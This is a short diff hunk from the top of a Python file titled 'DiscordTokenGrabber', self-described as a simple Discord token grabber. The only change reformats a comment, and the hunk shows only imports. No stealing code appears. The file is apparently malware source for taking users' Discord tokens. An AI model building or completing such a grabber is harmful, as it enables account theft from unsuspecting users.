@@ -1,5 +1,5 @@
 # DiscordTokenGrabber
-#A simple Discord token grabber
+# A simple Discord token grabber
 import os
 import re
 import json
